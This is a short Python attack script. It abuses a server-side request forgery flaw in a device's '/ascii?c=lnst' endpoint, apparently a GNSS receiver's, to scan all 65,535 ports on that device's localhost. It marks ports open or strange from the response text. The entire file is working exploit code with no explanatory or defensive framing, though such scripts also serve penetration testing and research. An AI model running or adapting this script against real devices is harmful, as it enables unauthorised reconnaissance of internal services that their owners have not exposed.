#!/bin/python3
import requests as r


RECEIVER_URL = '192.168.3.1'
SCANNED_URL = '127.0.0.1'
PORT_RANGE = (1,65535)
OK_MESSAGE = 'SOURCETABLEINCOMPLETE'
FAIL_MESSAGE = 'Requesting sourcetable failed'

SSRF_URL = f"http://{RECEIVER_URL}/ascii?c=lnst,{SCANNED_URL},{{port}}"


for port in range(PORT_RANGE[0],PORT_RANGE[1]+1):
    url = SSRF_URL.format(port=port)
    res = r.get(url)
    
    if OK_MESSAGE in res.text:
        print(f'Port {port}: Open')
    elif FAIL_MESSAGE not in res.text:
        print(f'Port {port}: Strange behaviour\n{res.text}')

    print(f'Port {port}', end='\r')
